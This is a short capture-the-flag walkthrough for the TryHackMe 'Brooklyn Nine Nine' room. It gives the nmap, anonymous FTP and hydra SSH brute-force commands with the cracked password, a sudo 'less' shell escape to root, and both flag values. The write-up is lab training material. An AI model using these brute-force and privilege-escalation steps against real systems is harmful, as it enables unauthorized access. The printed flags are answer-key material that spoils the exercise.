 # Brooklyn-Nine-Nine-CTF

https://tryhackme.com/room/brooklynninenine

###### use nmap to scan for open ports : nmap -sS -sV  10.10.5.209

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

gain access to ftp server using anoymous and found note_to_jake.txt

cat the file and a clue will appear:

* * From Amy,

* * Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

try using hydra with user account as jake to brute force the weak password

###### hydra -t 4 -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.5.209 

[22][ssh] host: 10.10.5.209   login: jake   password: 987654321

search around and cd to Holt directory to find user.txt file

cat user.txt to get the first flag

use sudo -l to get more details

(ALL) NOPASSWD: /usr/bin/less

we are able to use the less command in sudo 

sudo less /etc/profile

leverage it with !/bin/sh to gain access to root shell

cd to root and cat root.txt to get the final flag

## User flag

🏴‍☠️ee11cbb19052e40b07aac0ca060c23ee

## Root flag

🏴‍☠️63a9f0ea7bb98050796b649e85481845


